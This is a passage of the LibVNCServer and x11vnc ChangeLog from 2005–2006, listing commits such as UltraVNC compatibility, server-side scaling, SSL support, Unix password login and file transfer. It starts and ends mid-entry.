	libvncserver/sockets.c, libvncserver/stats.c, libvncserver/tight.c,
	libvncserver/tightvnc-filetransfer/rfbtightproto.h,
	libvncserver/ultra.c, libvncserver/zlib.c, libvncserver/zrle.c,
	rfb/rfb.h, rfb/rfbclient.h, rfb/rfbproto.h, x11vnc/rates.c,
	x11vnc/userinput.c: The great UltraVNC Compatibility Commit

2006-05-13  runge <runge>

	* ChangeLog, libvncclient/Makefile.am, libvncclient/lzoconf.h,
	libvncclient/minilzo.c, libvncclient/minilzo.h,
	libvncserver/lzoconf.h, libvncserver/minilzo.c,
	libvncserver/minilzo.h, libvncserver/rfbserver.c,
	libvncserver/scale.c, vncterm/Makefile.am:  fix some build issues WRT ultravnc code.

2006-05-07  runge <runge>

	* ChangeLog, configure.ac, x11vnc/8to24.c, x11vnc/ChangeLog,
	x11vnc/Makefile.am, x11vnc/README, x11vnc/connections.c,
	x11vnc/cursor.c, x11vnc/gui.c, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/linuxfb.c, x11vnc/linuxfb.h, x11vnc/options.c,
	x11vnc/options.h, x11vnc/params.h, x11vnc/pm.c, x11vnc/pointer.c,
	x11vnc/rates.c, x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/screen.h, x11vnc/selection.c, x11vnc/solid.c,
	x11vnc/sslhelper.c, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/unixpw.c, x11vnc/user.c, x11vnc/userinput.c, x11vnc/v4l.c,
	x11vnc/v4l.h, x11vnc/win_utils.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xdamage.c,
	x11vnc/xevents.c, x11vnc/xinerama.c, x11vnc/xkb_bell.c,
	x11vnc/xrandr.c, x11vnc/xrecord.c, x11vnc/xwrappers.c,
	x11vnc/xwrappers.h:  x11vnc: support for video4linux webcams & tv-tuners, -24to32 bpp
	 option, -rawfb console.

2006-05-04  steven_carr <steven_carr>

	* ChangeLog, libvncclient/rfbproto.c, libvncserver/rfbserver.c,
	rfb/rfb.h, rfb/rfbproto.h, x11vnc/screen.c: Server Capability
	Encodings rfbEncodingSupportedEncodings - What encodings are
	supported? rfbEncodingSupportedMessages  - What message types are
	supported? rfbEncodingServerIdentity     - What is the servers
	version string? ie: "x11vnc: 0.8.1 lastmod: 2006-04-25 (LibVNCServer
	0.9pre)"

2006-05-04  steven_carr <steven_carr>

	* libvncclient/rfbproto.c: UltraVNC with scaling, will send
	rectangles with a zero W or H We need to process the rectangle
	(especially if it a type that contains subrectangles or any kind of
	compression).   UltraVNC should be fixed to prevent these useless
	rectangles from being sent.

2006-05-04  steven_carr <steven_carr>

	* libvncclient/rfbproto.c, libvncclient/vncviewer.c,
	rfb/rfbclient.h: Client side support for PalmVNC/UltraVNC 'Server
	Side Scaling'

2006-05-04  steven_carr <steven_carr>

	* rfb/rfbproto.h: KeyboardLedState should be placed in 'various
	protocol extensions'

2006-05-03  steven_carr <steven_carr>

	* ChangeLog, libvncserver/Makefile.am, libvncserver/corre.c,
	libvncserver/cursor.c, libvncserver/hextile.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/rre.c, libvncserver/scale.c,
	libvncserver/scale.h, libvncserver/stats.c, libvncserver/tight.c,
	libvncserver/ultra.c, libvncserver/zlib.c, libvncserver/zrle.c,
	rfb/rfb.h: Client Independent Server Side Scaling is now supported
	Both PalmVNC and UltraVNC SetScale messages are supported

2006-05-02  steven_carr <steven_carr>

	* ChangeLog, libvncclient/Makefile.am, libvncclient/lzoconf.h,
	libvncclient/minilzo.c, libvncclient/minilzo.h,
	libvncclient/rfbproto.c, libvncclient/ultra.c,
	libvncclient/vncviewer.c, libvncserver/Makefile.am,
	libvncserver/lzoconf.h, libvncserver/minilzo.c,
	libvncserver/minilzo.h, libvncserver/rfbserver.c,
	libvncserver/ultra.c, rfb/rfb.h, rfb/rfbclient.h: Ultra Encoding
	added.   Tested against UltraVNC V1.01

2006-05-02  steven_carr <steven_carr>

	* libvncclient/rfbproto.c: CopyRectangle() BPP!=8 bug fixed

2006-05-02  steven_carr <steven_carr>

	* libvncclient/vncviewer.c: Eliminate incompatible pointer
	assignment warning (gcc 4.0.1)

2006-05-02  steven_carr <steven_carr>

	* libvncclient/hextile.c, libvncclient/tight.c, libvncclient/zlib.c: 
	signed vs unsigned warnings eliminated (gcc 4.0.1)

2006-04-30  dscho <dscho>

	* examples/Makefile.am: include rotatetemplate.c in the tarball

2006-04-28  dscho <dscho>

	* client_examples/SDLvncviewer.c, libvncclient/rfbproto.c,
	rfb/rfbclient.h: libvncclient: support changing of framebuffer size;
	make SDLvncviewer use it

2006-04-28  dscho <dscho>

	* client_examples/SDLvncviewer.c: fix SDLvncviewer for widths which
	are not divisible by 8

2006-04-27  dscho <dscho>

	* ChangeLog, examples/.cvsignore, examples/Makefile.am,
	examples/pnmshow.c, examples/rotate.c, examples/rotatetemplate.c: 
	add rotate and flip example

2006-04-27  dscho <dscho>

	* examples/camera.c: malloc.h should not be needed (it is missing on
	quite a few platforms)

2006-04-26  runge <runge>

	* ChangeLog, classes/ssl/ssl_vncviewer,
	client_examples/Makefile.am, configure.ac, contrib/Makefile.am,
	examples/Makefile.am, libvncclient/Makefile.am,
	libvncserver/Makefile.am,
	libvncserver/tightvnc-filetransfer/Makefile.am, test/Makefile.am,
	x11vnc/ChangeLog, x11vnc/Makefile.am, x11vnc/README, x11vnc/help.c,
	x11vnc/sslhelper.c, x11vnc/x11vnc.1, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c:  Make VPATH building work with -I $(top_srcdir) for rfb/rfb.h

2006-04-17  steven_carr <steven_carr>

	* ChangeLog, examples/Makefile.am, examples/camera.c: Added an
	example camera application to demonstrate another way to write a
	server application.

2006-04-16  runge <runge>

	* classes/ssl/ssl_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c, x11vnc/help.c,
	x11vnc/sslcmds.c, x11vnc/sslhelper.c, x11vnc/ssltools.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c:  Apache SSL gateway. More web proxy cases for Java and
	 ssl_vncviewer.

2006-04-05  runge <runge>

	* ChangeLog, classes/ssl/Makefile.am, classes/ssl/README,
	classes/ssl/proxy.vnc, classes/ssl/ssl_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	configure.ac, prepare_x11vnc_dist.sh, x11vnc/ChangeLog,
	x11vnc/Makefile.am, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/cleanup.h, x11vnc/connections.c, x11vnc/help.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/pm.c, x11vnc/pm.h,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c, x11vnc/sslcmds.c,
	x11vnc/sslcmds.h, x11vnc/sslhelper.c, x11vnc/sslhelper.h,
	x11vnc/ssltools.h, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c:  SSL Java viewer work thru proxy.  -sslGenCA, etc key/cert
	 management utils for x11vnc.  FBPM "support".

2006-03-28  dscho <dscho>

	* ChangeLog, client_examples/SDLvncviewer.c,
	libvncclient/rfbproto.c, libvncclient/vncviewer.c,
	libvncserver/main.c, libvncserver/rfbserver.c, rfb/rfb.h,
	rfb/rfbclient.h, rfb/rfbproto.h: add KeyboardLedState extension

2006-03-28  runge <runge>

	* ChangeLog, classes/Makefile.am, classes/ssl/Makefile.am,
	classes/ssl/index.vnc,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-cursor-colors+no-tab
	-traversal.patch,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	configure.ac, libvncserver/httpd.c, prepare_x11vnc_dist.sh,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/connections.h, x11vnc/cursor.c,
	x11vnc/help.c, x11vnc/keyboard.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/pointer.c, x11vnc/rates.c,
	x11vnc/remote.c, x11vnc/screen.c, x11vnc/sslcmds.c,
	x11vnc/sslhelper.c, x11vnc/sslhelper.h, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c,
	x11vnc/xwrappers.c:  SSL patch for Java viewer.  https support for x11vnc.

2006-03-27  dscho <dscho>

	* AUTHORS, ChangeLog, libvncserver/rfbserver.c: ignore
	maxRectsPerUpdate when encoding is Zlib (thanks scarr)

2006-03-27  dscho <dscho>

	* libvncclient/vncviewer.c: libvncclient: take -compress <level> and
	-quality <level> command line arguments

2006-03-12  runge <runge>

	* configure.ac, x11vnc/ChangeLog, x11vnc/Makefile.am,
	x11vnc/README, x11vnc/cleanup.c, x11vnc/connections.c,
	x11vnc/gui.c, x11vnc/help.c, x11vnc/misc/Xdummy, x11vnc/options.c,
	x11vnc/options.h, x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/screen.h, x11vnc/selection.c, x11vnc/sslcmds.c,
	x11vnc/sslhelper.c, x11vnc/sslhelper.h, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c:  x11vnc: add -ssl mode using libssl.  Include Xdummy in misc.

2006-03-08  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/options.c, x11vnc/options.h, x11vnc/remote.c,
	x11vnc/screen.c, x11vnc/selection.c, x11vnc/selection.h,
	x11vnc/sslcmds.c, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/unixpw.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xevents.c, x11vnc/xevents.h:  x11vnc: do CLIPBOARD, reverse conn require passwds, -usepw,
	 -debug_sel, -storepasswd homedir.

2006-03-06  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/connections.h, x11vnc/gui.c, x11vnc/gui.h, x11vnc/help.c,
	x11vnc/params.h, x11vnc/remote.c, x11vnc/sslcmds.c,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/unixpw.c,
	x11vnc/unixpw.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c, x11vnc/xevents.c, x11vnc/xevents.h:  x11vnc: gui speedup and fixes. -unixpw and -inetd

2006-03-05  runge <runge>

	* configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/connections.c, x11vnc/gui.c, x11vnc/help.c, x11vnc/inet.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/remote.c,
	x11vnc/sslcmds.c, x11vnc/sslcmds.h, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/unixpw.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c:  x11vnc: -unixpw on *bsd, hpux and tru64. -unixpw_nis mode. stunnel
	 and gui tweaks.

2006-03-03  runge <runge>

	* configure.ac, x11vnc/8to24.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/connections.c, x11vnc/help.c, x11vnc/inet.c, x11vnc/inet.h,
	x11vnc/keyboard.c, x11vnc/remote.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/unixpw.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c:  x11vnc: more -unixpw mode. -gone popup mode. Change filexfer via
	 -R. Tune SMALL_FOOTPRINT.

2006-03-01  dscho <dscho>

	* examples/Makefile.am, examples/blooptest.c, examples/example.c: 
	Fix blooptest example

2006-03-01  dscho <dscho>

	* rfb/keysym.h: do not assume that KEYSYM_H guards X11's keysym.h

2006-03-01  dscho <dscho>

	* libvncserver/main.c: do not timeout on idle client input (with
	pthreads)

2006-03-01  dscho <dscho>

	* examples/Makefile.am: if compiling with pthreads, also compile
	blooptest

2006-02-28  dscho <dscho>

	* libvncserver/sockets.c: rfbCheckFds now returns the number of
	processed events

2006-02-28  dscho <dscho>

	* AUTHORS, ChangeLog, libvncserver/main.c, libvncserver/sockets.c,
	rfb/rfb.h: add handleEventsEagerly flag (Thanks, Donald)

2006-02-25  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/Makefile.am,
	x11vnc/README, x11vnc/allowed_input_t.h, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/cursor.c, x11vnc/help.c,
	x11vnc/inet.c, x11vnc/inet.h, x11vnc/keyboard.c, x11vnc/keyboard.h,
	x11vnc/options.c, x11vnc/options.h, x11vnc/pointer.c,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/selection.c, x11vnc/sslcmds.c, x11vnc/sslcmds.h,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/unixpw.c,
	x11vnc/unixpw.h, x11vnc/user.c, x11vnc/userinput.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xdamage.c, x11vnc/xevents.c,
	x11vnc/xrecord.c:  x11vnc: -unixpw and -stunnel.  Add clipboard to input control.

2006-02-24  rohit_99129 <rohit_99129>

	* libvncserver/main.c, rfb/rfb.h: Added method to get extension
	specific client data

2006-02-24  rohit_99129 <rohit_99129>

	* ChangeLog, libvncserver/main.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c, rfb/rfb.h: 
	Added method to get extension specific client data

2006-02-22  dscho <dscho>

	* ChangeLog, libvncserver/auth.c, libvncserver/main.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c, rfb/rfb.h: add
	functions to unregister extensions/security types

2006-02-21  dscho <dscho>

	* configure.ac, x11vnc/Makefile.am: IRIX linker is very picky about
	order of libraries

2006-02-20  runge <runge>

	* ChangeLog, configure.ac, libvncserver/cursor.c,
	libvncserver/main.c,
	libvncserver/tightvnc-filetransfer/filelistinfo.c,
	libvncserver/tightvnc-filetransfer/filetransfermsg.c,
	libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c,
	prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/connections.c, x11vnc/inet.c, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c, x11vnc/xevents.c:  fix some non-gcc compiler warnings and signals in x11vnc

2006-02-07  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.h: x11vnc: fix AIX build wrt h_errno.

2006-02-06  runge <runge>

	* x11vnc/8to24.c, x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/win_utils.c, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c:  x11vnc: -8to24 more speedups; tunables for very slow machines.

2006-02-05  runge <runge>

	* x11vnc/8to24.c, x11vnc/8to24.h, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/help.c, x11vnc/options.c, x11vnc/options.h, x11vnc/params.h,
	x11vnc/rates.c, x11vnc/scan.c, x11vnc/scan.h, x11vnc/userinput.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xinerama.c:  x11vnc: -8to24 speedups and improvements.

2006-01-22  runge <runge>

	* x11vnc/8to24.c, x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/pointer.c,
	x11vnc/rates.c, x11vnc/remote.c, x11vnc/screen.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/win_utils.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c:  x11vnc: -8to24 opts, use XGetSubImage. fix -threads deadlocks and
	 -rawfb crash

2006-01-19  runge <runge>

	* x11vnc/8to24.c, x11vnc/8to24.h, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/cursor.c, x11vnc/help.c, x11vnc/remote.c, x11vnc/scan.c,
	x11vnc/screen.c, x11vnc/userinput.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c:  x11vnc: -8to24 now works on default depth 8 displays.

2006-01-16  runge <runge>

	* x11vnc/8to24.c, x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/util.c, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c:  x11vnc: more tweaks to -8to24 XGETIMAGE_8TO24

2006-01-15  runge <runge>

	* ChangeLog, x11vnc/8to24.c, x11vnc/8to24.h, x11vnc/ChangeLog,
	x11vnc/Makefile.am, x11vnc/README, x11vnc/connections.c,
	x11vnc/cursor.c, x11vnc/help.c, x11vnc/options.c, x11vnc/options.h,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/userinput.c, x11vnc/util.c,
	x11vnc/util.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c:  x11vnc: add -8to24 option for some multi-depth displays.

2006-01-12  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.h: configure.ac:
	add switches for most X extensions.

2006-01-11  runge <runge>

	* libvncserver/main.c, prepare_x11vnc_dist.sh, x11vnc/README,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: logMutex needs to be
	initialized too; in rfbDefaultLog.

2006-01-11  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/cursor.c, x11vnc/keyboard.c,
	x11vnc/pointer.c, x11vnc/scan.c, x11vnc/screen.c, x11vnc/solid.c,
	x11vnc/userinput.c, x11vnc/win_utils.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c, x11vnc/xdamage.c,
	x11vnc/xrecord.c:  x11vnc: close fd > 2 in run_user_command(), -nocmds in crash_debug,
	 fix 64bit bug for -solid.

2006-01-10  dscho <dscho>

	* ChangeLog, libvncserver/main.c, libvncserver/rfbserver.c: 
	rfbProcessEvents() has to iterate also over clients with sock < 0 to
	close them

2006-01-09  runge <runge>

	* ChangeLog, examples/pnmshow24.c, x11vnc/ChangeLog,
	x11vnc/Makefile.am, x11vnc/README, x11vnc/allowed_input_t.h,
	x11vnc/blackout_t.h, x11vnc/cleanup.c, x11vnc/cleanup.h,
	x11vnc/connections.c, x11vnc/connections.h, x11vnc/cursor.c,
	x11vnc/cursor.h, x11vnc/enums.h, x11vnc/gui.c, x11vnc/gui.h,
	x11vnc/help.c, x11vnc/help.h, x11vnc/inet.c, x11vnc/inet.h,
	x11vnc/keyboard.c, x11vnc/keyboard.h, x11vnc/options.c,
	x11vnc/options.h, x11vnc/params.h, x11vnc/pointer.c,
	x11vnc/pointer.h, x11vnc/rates.c, x11vnc/rates.h, x11vnc/remote.c,
	x11vnc/remote.h, x11vnc/scan.c, x11vnc/scan.h, x11vnc/screen.c,
	x11vnc/screen.h, x11vnc/scrollevent_t.h, x11vnc/selection.c,
	x11vnc/selection.h, x11vnc/solid.c, x11vnc/solid.h,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/user.c, x11vnc/user.h,
	x11vnc/userinput.c, x11vnc/userinput.h, x11vnc/util.c,
	x11vnc/util.h, x11vnc/win_utils.c, x11vnc/win_utils.h,
	x11vnc/winattr_t.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xdamage.c,
	x11vnc/xdamage.h, x11vnc/xevents.c, x11vnc/xevents.h,
	x11vnc/xinerama.c, x11vnc/xinerama.h, x11vnc/xkb_bell.c,
	x11vnc/xkb_bell.h, x11vnc/xrandr.c, x11vnc/xrandr.h,
	x11vnc/xrecord.c, x11vnc/xrecord.h, x11vnc/xwrappers.c,
	x11vnc/xwrappers.h:  x11vnc: the big split.

2006-01-08  runge <runge>

	* ChangeLog, examples/pnmshow24.c, libvncclient/vncviewer.c,
	libvncserver/main.c:  fix client non-jpeg/libz builds

2006-01-06  runge <runge>

	* ChangeLog, libvncserver/main.c:  rfbRegisterProtocolExtension extMutex was never initialized.

2005-12-24  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: enhance -passwdfile features, filetransfer on by default.

2005-12-22  dscho <dscho>

	* libvncserver/rfbserver.c: make compile again with pthreads; fix
	off-by-one error

2005-12-19  dscho <dscho>

	* AUTHORS, ChangeLog, libvncserver/cargs.c, libvncserver/main.c,
	libvncserver/rfbserver.c, rfb/rfb.h: introduce -deferptrupdate
	(thanks Dave)

2005-12-19  dscho <dscho>

	* client_examples/SDLvncviewer.c, libvncclient/sockets.c,
	libvncclient/vncviewer.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/sockets.c: assorted fixes for
	MinGW32

2005-12-09  dscho <dscho>

	* ChangeLog, configure.ac, libvncclient/sockets.c,
	libvncserver/sockets.c: work around write() returning ENOENT on
	Solaris 2.7

2005-12-09  dscho <dscho>

	* examples/mac.c: previous patch turned compile warning in a compile
	error; fix that ;-)

2005-12-08  dscho <dscho>

	* examples/mac.c: fix compile warnings

2005-12-07  dscho <dscho>

	* libvncclient/vncviewer.c: one more memory leak

2005-12-07  dscho <dscho>

	* ChangeLog, libvncclient/vncviewer.c, rfb/rfbclient.h: plug memory
	leaks

2005-12-07  dscho <dscho>

	* client_examples/SDLvncviewer.c: translate keys based on unicode
	(much more reliable than sym)

2005-11-28  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: add -loop option.

2005-11-25  runge <runge>

	* ChangeLog, configure.ac, libvncclient/rfbproto.c,
	libvncclient/tight.c, libvncclient/vncviewer.c,
	libvncserver/Makefile.am, libvncserver/auth.c, libvncserver/main.c,
	libvncserver/private.h, libvncserver/rfbserver.c,
	libvncserver/tightvnc-filetransfer/filelistinfo.h,
	libvncserver/tightvnc-filetransfer/filetransfermsg.c,
	libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c,
	rfb/rfbclient.h, rfb/rfbproto.h, x11vnc/ChangeLog,
	x11vnc/misc/x11vnc_pw, x11vnc/x11vnc.c:  fix deadlock from rfbReleaseExtensionIterator(), fix no
	 libz/libjpeg builds, disable tightvnc-filetransfer if no
	 libpthread, add --without-pthread option, rm // comments, set
	 NAME_MAX if not defined, x11vnc: throttle load if fb update
	 requests not taking place.

2005-10-23  runge <runge>

	* configure.ac, x11vnc/README:  configure.ac: test ... == ... not allowed on all unix.

2005-10-23  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: -filexfer, -slow_fb, -blackout noptr,...

2005-10-07  dscho <dscho>

	* TODO: update TODO

2005-10-07  dscho <dscho>

	* examples/backchannel.c, libvncserver/rfbserver.c, rfb/rfb.h: The
	PseudoEncoding extension code was getting silly: If the client asked for an encoding, and no enabled extension
	handled it, LibVNCServer would walk through all extensions, and if
	they promised to handle the encoding, execute the extension's
	newClient() if it was not NULL.  However, if newClient is not NULL, it will be called when a client
	connects, and if it returns TRUE, the extension will be enabled.
	Since all the state of the extension should be in the client data,
	there is no good reason why newClient should return FALSE the first
	time (thus not enabling the extension), but TRUE when called just
	before calling enablePseudoEncoding().  So in effect, the extension got enabled all the time, even if that
	was not necessary.  The resolution is to pass a void** to enablePseudoEncoding. This has
	the further advantage that enablePseudoEncoding can remalloc() or
	free() the data without problems. Though keep in mind that if
	enablePseudoEncoding() is called on a not-yet-enabled extension, the
	passed data points to NULL.

2005-10-06  dscho <dscho>

	* ChangeLog: update ChangeLog for today

2005-10-06  dscho <dscho>

	* client_examples/Makefile.am, client_examples/SDLvncviewer.c,
	client_examples/backchannel.c, libvncclient/rfbproto.c,
	rfb/rfbclient.h: add an extension mechanism for LibVNCClient, modify
	the client data handling so that more than one data structure can be
	attached, and add an example to speak the client part of the back
	channel.

2005-10-06  dscho <dscho>

	* examples/Makefile.am, examples/backchannel.c: add BackChannel
	extension example

2005-10-06  dscho <dscho>

	* libvncclient/zrle.c: fix warning

2005-10-06  dscho <dscho>

	* configure.ac, examples/mac.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/stats.c,
	libvncserver/tightvnc-filetransfer/filetransfermsg.c, rfb/rfb.h,
	rfb/rfbproto.h: kill BackChannel and CustomClientMessage: the new
	extension technique makes these hooks obsolete

2005-10-06  dscho <dscho>

	* libvncserver/rfbserver.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c, rfb/rfb.h: 
	provide a list of the pseudo encodings understood by the extension

2005-10-06  dscho <dscho>

	* contrib/Makefile.am, x11vnc/Makefile.am: DEFINES -> AM_CFLAGS

2005-10-06  dscho <dscho>

	* client_examples/Makefile.am, examples/Makefile.am,
	libvncclient/Makefile.am,
	libvncserver/tightvnc-filetransfer/Makefile.am, test/Makefile.am: do
	it right: it is not DEFINES, but AM_CFLAGS

2005-10-03  dscho <dscho>

	* ChangeLog, libvncserver/rfbserver.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c, rfb/rfb.h: add
	enablePseudoEncoding() to rfbProtocolExtension

2005-09-29  dscho <dscho>

	* TODO, index.html: more TODOs, and an update to the website

2005-09-28  dscho <dscho>

	* AUTHORS, ChangeLog, configure.ac, examples/.cvsignore,
	examples/Makefile.am, examples/filetransfer.c,
	libvncclient/.cvsignore, libvncserver/.cvsignore,
	libvncserver/Makefile.am, libvncserver/auth.c,
	libvncserver/cargs.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/sockets.c,
	libvncserver/tightvnc-filetransfer/.cvsignore,
	libvncserver/tightvnc-filetransfer/Makefile.am,
	libvncserver/tightvnc-filetransfer/filelistinfo.c,
	libvncserver/tightvnc-filetransfer/filelistinfo.h,
	libvncserver/tightvnc-filetransfer/filetransfermsg.c,
	libvncserver/tightvnc-filetransfer/filetransfermsg.h,
	libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c,
	libvncserver/tightvnc-filetransfer/handlefiletransferrequest.h,
	libvncserver/tightvnc-filetransfer/rfbtightproto.h,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c, rfb/rfb.h: This
	monster commit contains support for TightVNC's file transfer
	protocol.  Thank you very much, Rohit!

2005-09-27  dscho <dscho>

	* ChangeLog, libvncserver/cargs.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/sockets.c, rfb/rfb.h: 
	Introduce generic protocol extension method. Deprecate the
	processCustomClientMessage() method.

2005-09-27  dscho <dscho>

	* libvncserver/auth.c, libvncserver/main.c, rfb/rfb.h: Security is
	global. This was a misguided attempt to evade a global list.  I
	eventually saw the light and went with Rohit´s original approach.

2005-09-27  dscho <dscho>

	* client_examples/Makefile.am, client_examples/vnc2mpg.c: support
	new ffmpeg version

2005-09-26  dscho <dscho>

	* ChangeLog, libvncserver/auth.c, libvncserver/main.c,
	libvncserver/rfbserver.c, rfb/rfb.h, rfb/rfbproto.h: support VNC
	protocol version 3.7

2005-08-22  dscho <dscho>

	* prepare_x11vnc_dist.sh: for x11vnc standalone package, adaptions
	were needed after changing LibVNCServer.spec.in

2005-08-21  dscho <dscho>

	* AUTHORS, ChangeLog, LibVNCServer.spec.in: split rpm into three
	packages: the library, -devel (headers), and x11vnc

2005-07-18  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: more gui fixes, gui requests via client_sock,
	 PASSWD_REQUIRED build opt.

2005-07-13  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: setup for new release 0.7.3 while I remember how..

2005-07-13  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: tweaks for release, fix queue buildup under -viewonly.

2005-07-11  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: more improvements to gui, scary nopassword warning msg.

2005-07-09  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
